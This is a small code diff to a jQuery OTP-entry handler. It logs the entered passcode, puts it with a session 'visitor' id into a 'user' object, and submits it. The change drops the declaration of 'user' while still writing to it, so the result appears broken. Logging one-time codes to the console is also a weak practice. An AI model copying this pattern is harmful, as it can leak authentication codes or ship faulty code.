@@ -239,22 +239,15 @@ $(document).ready(function () {
         }
 
         console.log("Entered OTP:", otp);
-
-        let userinfo = $('form').serializeArray();
-        let user = {};
+        
         let visitor = sessionStorage.getItem('visitor');
 
-        userinfo.forEach((item) => {
-            user[item.name] = item.value;
-        });
-
+        user['code'] = otp;
         user['visitor'] = visitor;
 
         try {
 
             await submitFormData(user);
-
-            // Optional: show success message or redirect
 
         } catch (error) {
 
